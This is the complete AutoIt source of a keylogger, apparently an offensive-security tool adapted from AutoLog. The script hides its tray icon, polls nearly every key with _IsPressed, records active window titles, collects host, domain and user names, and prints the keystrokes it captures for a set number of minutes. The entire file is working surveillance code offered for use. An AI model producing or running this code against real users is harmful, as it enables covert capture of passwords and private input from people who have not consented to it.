#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Change2CUI=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

#include <Date.au3>
#include <misc.au3>

#cs --------------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         VIVI (https://github.com/V1V1) | (https://twitter.com/_theVIVI)

 Script Function:
	Logs a user's keystrokes using AutoIt's IsPressed function.

 Notes:
	This script is just a modified version of AutoLog (https://github.com/pyrroman/AutoLog)
    All credit goes to pyrroman for writing the actual meat of it.

    Modifications I made:
        Add support for special character keyboard input.
        Log keystrokes for a user specified amount of time.
        Log keystrokes to stdout instead of a HTML file on disk.

#ce --------------------------------------------------------------------------------


#cs ----------------------------------------------------------------------------

AutoLog functions:
    _writeKeyToFile() renamed to _printKey()
    _getPressedKey()
    _read()

#ce ----------------------------------------------------------------------------

Global $key = ""			; The pressed Key
Global $last = ""			; The pressed Key in the last iteration
Global $pressed = False		; A boolean to indicate whether a key was pressed in an iteration
Global $wait_time = 22 		; The time to wait between iterations (in milliseconds)
Global $active_window = ""	; The last active window
Opt("WinTitleMatchMode", 2) ; Setting the WinTitleMatchMode for window-logging

; Prints the last key pressed to stdout
Func _printKey()
    If $active_window <> WinGetTitle("[ACTIVE]") Then
		$active_window = WinGetTitle("[ACTIVE]")
        ConsoleWrite(@CRLF & @CRLF & @CRLF & "----- ACTIVE WINDOW (" & $active_window & ") -----" & @CRLF & @CRLF & @CRLF)
	EndIf
	If StringLen($key) > 1 Then	; If the String is longer than 1, the pressed key cannot be a letter or number. It has to be a special key
        ConsoleWrite("[" & $key & "]")
	Else
		ConsoleWrite($key)
	EndIF
EndFunc

; Returns the pressed key at the moment
Func _getPressedKey()
    Global $key = ""
    If _IsPressed('08') Then $key = "BACKSPACE"
	If _IsPressed('09') Then $key = "TAB"
	If _IsPressed('0C') Then $key = "CLEAR"
	If _IsPressed('0D') Then $key = "ENTER"
	If _IsPressed('11') Then $key = "CTRL"
	If _IsPressed('12') Then $key = "ALT"
	If _IsPressed('13') Then $key = "PAUSE"
	If _IsPressed('14') Then $key = "CAPS LOCK"
	If _IsPressed('1B') Then $key = "ESC"
	If _IsPressed('20') Then $key = " "
	If _IsPressed('21') Then $key = "PAGE UP"
	If _IsPressed('22') Then $key = "PAGE DOWN"
	If _IsPressed('23') Then $key = "END"
	If _IsPressed('24') Then $key = "HOME"
	If _IsPressed('25') Then $key = "LEFT ARROW"
	If _IsPressed('26') Then $key = "UP ARROW"
	If _IsPressed('27') Then $key = "RIGHT ARROW"
	If _IsPressed('28') Then $key = "DOWN ARROW"
	If _IsPressed('29') Then $key = "SELECT"
	If _IsPressed('2A') Then $key = "PRINT"
	If _IsPressed('2B') Then $key = "EXECUTE"
	If _IsPressed('2C') Then $key = "PRINT SCREEN"
	If _IsPressed('2D') Then $key = "INS"
	If _IsPressed('2E') Then $key = "DEL"
	If _IsPressed('30') Then $key = "0"
	If _IsPressed('31') Then $key = "1"
	If _IsPressed('32') Then $key = "2"
	If _IsPressed('33') Then $key = "3"
	If _IsPressed('34') Then $key = "4"
	If _IsPressed('35') Then $key = "5"
	If _IsPressed('36') Then $key = "6"
	If _IsPressed('37') Then $key = "7"
	If _IsPressed('38') Then $key = "8"
	If _IsPressed('39') Then $key = "9"
	If _IsPressed('41') Then $key = "A"
	If _IsPressed('42') Then $key = "B"
	If _IsPressed('43') Then $key = "C"
	If _IsPressed('44') Then $key = "D"
	If _IsPressed('45') Then $key = "E"
	If _IsPressed('46') Then $key = "F"
	If _IsPressed('47') Then $key = "G"
	If _IsPressed('48') Then $key = "H"
	If _IsPressed('49') Then $key = "I"
	If _IsPressed('4A') Then $key = "J"
	If _IsPressed('4B') Then $key = "K"
	If _IsPressed('4C') Then $key = "L"
	If _IsPressed('4D') Then $key = "M"
	If _IsPressed('4E') Then $key = "N"
	If _IsPressed('4F') Then $key = "O"
	If _IsPressed('50') Then $key = "P"
	If _IsPressed('51') Then $key = "Q"
	If _IsPressed('52') Then $key = "R"
	If _IsPressed('53') Then $key = "S"
	If _IsPressed('54') Then $key = "T"
	If _IsPressed('55') Then $key = "U"
	If _IsPressed('56') Then $key = "V"
	If _IsPressed('57') Then $key = "W"
	If _IsPressed('58') Then $key = "X"
	If _IsPressed('59') Then $key = "Y"
	If _IsPressed('5A') Then $key = "Z"
	If _IsPressed('5B') Then $key = "Left Windows"
	If _IsPressed('5C') Then $key = "Right Windows"
	If _IsPressed('60') Then $key = "Numpad 0"
	If _IsPressed('61') Then $key = "Numpad 1"
	If _IsPressed('62') Then $key = "Numpad 2"
	If _IsPressed('63') Then $key = "Numpad 3"
	If _IsPressed('64') Then $key = "Numpad 4"
	If _IsPressed('65') Then $key = "Numpad 5"
	If _IsPressed('66') Then $key = "Numpad 6"
	If _IsPressed('67') Then $key = "Numpad 7"
	If _IsPressed('68') Then $key = "Numpad 8"
	If _IsPressed('69') Then $key = "Numpad 9"
	If _IsPressed('6A') Then $key = "Multiply"
	If _IsPressed('6B') Then $key = "Add"
	If _IsPressed('6C') Then $key = "Separator"
	If _IsPressed('6D') Then $key = "Subtract"
	If _IsPressed('6E') Then $key = "Decimal"
	If _IsPressed('6F') Then $key = "Divide"
	If _IsPressed('70') Then $key = "F1"
	If _IsPressed('71') Then $key = "F2"
	If _IsPressed('72') Then $key = "F3"
	If _IsPressed('73') Then $key = "F4"
	If _IsPressed('74') Then $key = "F5"
	If _IsPressed('75') Then $key = "F6"
	If _IsPressed('76') Then $key = "F7"
	If _IsPressed('77') Then $key = "F8"
	If _IsPressed('78') Then $key = "F9"
	If _IsPressed('79') Then $key = "F10"
	If _IsPressed('7A') Then $key = "F11"
	If _IsPressed('7B') Then $key = "F12"
	If _IsPressed('90') Then $key = "NUM LOCK"
	If _IsPressed('91') Then $key = "SCROLL LOCK"
	If _IsPressed('A2') Then $key = "Left CONTROL"
	If _IsPressed('A3') Then $key = "Right CONTROL"
	If _IsPressed('A4') Then $key = "Left ALT"
	If _IsPressed('A5') Then $key = "Right ALT"
	If _IsPressed('BA') Then $key = ";"
	If _IsPressed('BB') Then $key = "="
	If _IsPressed('BC') Then $key = ","
	If _IsPressed('BD') Then $key = "-"
	If _IsPressed('BE') Then $key = "."
	If _IsPressed('BF') Then $key = "/"
	If _IsPressed('C0') Then $key = "`"
	If _IsPressed('DB') Then $key = "["
	If _IsPressed('DC') Then $key = "\"
	If _IsPressed('DD') Then $key = "]"
    If _IsPressed('DE') Then $key = "'"

    ; Identify special characters input
    If _IsPressed('A0') And _IsPressed('30') Then $key = ")"
    If _IsPressed('A0') And _IsPressed('31') Then $key = "!"
    If _IsPressed('A0') And _IsPressed('32') Then $key = "@"
    If _IsPressed('A0') And _IsPressed('33') Then $key = "#"
    If _IsPressed('A0') And _IsPressed('34') Then $key = "$"
    If _IsPressed('A0') And _IsPressed('35') Then $key = "%"
    If _IsPressed('A0') And _IsPressed('36') Then $key = "^"
    If _IsPressed('A0') And _IsPressed('37') Then $key = "&"
    If _IsPressed('A0') And _IsPressed('38') Then $key = "*"
    If _IsPressed('A0') And _IsPressed('39') Then $key = "("
    If _IsPressed('A0') And _IsPressed('BA') Then $key = ":"
    If _IsPressed('A0') And _IsPressed('BB') Then $key = "+"
    If _IsPressed('A0') And _IsPressed('BC') Then $key = "<"
    If _IsPressed('A0') And _IsPressed('BD') Then $key = "_"
    If _IsPressed('A0') And _IsPressed('BE') Then $key = ">"
    If _IsPressed('A0') And _IsPressed('BF') Then $key = "?"
    If _IsPressed('A0') And _IsPressed('C0') Then $key = "~"
    If _IsPressed('A0') And _IsPressed('DB') Then $key = "{"
    If _IsPressed('A0') And _IsPressed('DC') Then $key = "|"
    If _IsPressed('A0') And _IsPressed('DD') Then $key = "}"
    If _IsPressed('A0') And _IsPressed('DE') Then $key = '"'

    ; If the key was a letter and the shift-key wasn't pressed, it will be lowered
    If StringLen($key) < 2 Then
        If not _IsPressed('10') Then
            $key = StringLower($key)
        EndIf
    EndIf

    If StringCompare($key, "") Then $pressed = True ; Strangely "StringCompare" gives you a 0 (also interpreted as "False") when the strings match

    return $key

EndFunc

; Takes the last pressed key and prints to stdout
Func _read()

    $last = $key
    _getPressedKey()
    If $pressed Then
        If ($last <> $key) Then _printKey()
    EndIf
    Sleep($wait_time) ; Waiting just to keep the CPU-usage at a minimum

EndFunc

#cs ----------------------------------------------------------------------------

Main functions:
    _CheckArguments()
    _Keylogger()
    _StopKeylogger()

#ce ----------------------------------------------------------------------------

Func _CheckArguments()

    If $CmdLine[0] <= 0 Then
        ConsoleWrite("[X] You must provide a length of time to run the keylogger for (in minutes)" & @CRLF & @CRLF)
        ConsoleWrite("[i] Keylogger.exe 5" & @CRLF & @CRLF)
        Exit

    ElseIf $CmdLine[0] > 1 Then
        ConsoleWrite("[X] Too many arguments provided." & @CRLF & @CRLF)
        ConsoleWrite("[i] Keylogger.exe 5" & @CRLF & @CRLF)
        Exit

    EndIf

    ; Ensure timer argument is a numeric value
    Global $timerArg = Number($CmdLine[1])

    ConsoleWrite("[i] Keylogger timer: " & $timerArg & " minutes " & @CRLF & @CRLF)

    If $timerArg = 0 Then
        ConsoleWrite("[X] Timer argument must be a numeric value. Exiting." & @CRLF & @CRLF)
        Exit
    EndIf

EndFunc ;==>_CheckArguments

Func _Keylogger()

    ; Print system info
    ConsoleWrite("----- System Info -----" & @CRLF & @CRLF)
    ConsoleWrite("Host    :   " & @ComputerName & @CRLF)
    ConsoleWrite("OS      :   " & @OSVersion & " (" & @OSArch & ")" & @CRLF)
    ConsoleWrite("Domain  :   " & @LogonDomain & @CRLF)
    ConsoleWrite("User    :   " & @UserName & @CRLF)
    ConsoleWrite("Date    :   " & _NowDate() & @CRLF & @CRLF)

    ; Start timer
    ConsoleWrite("[*] Started keylogger (" & _NowTime() & " | " & _NowDate() & ")")
    Global $stopTime = $timerArg * 60000
    Global $hTimer = TimerInit()

    ; An endless loop of reading keystrokes until our timer expires
    While 1
        _read()
        If TimerDiff($hTimer) >= $stopTime Then _StopKeylogger()
        Sleep(10)
    WEnd

EndFunc ;==>_Keylogger

; Stops keylogger after timer expires
Func _StopKeylogger()
    ConsoleWrite(@CRLF & @CRLF & @CRLF & @CRLF & "[*] Stopping keylogger (" & _NowTime() & " | " & _NowDate() & ")" & @CRLF & @CRLF)
    Exit
EndFunc ;==>_StopKeylogger

; Title
ConsoleWrite(@CRLF & "=========== Keylogger ===========" & @CRLF & @CRLF)

;~ Commandline arguments check
_CheckArguments()

;~ Start keylogger
_Keylogger()
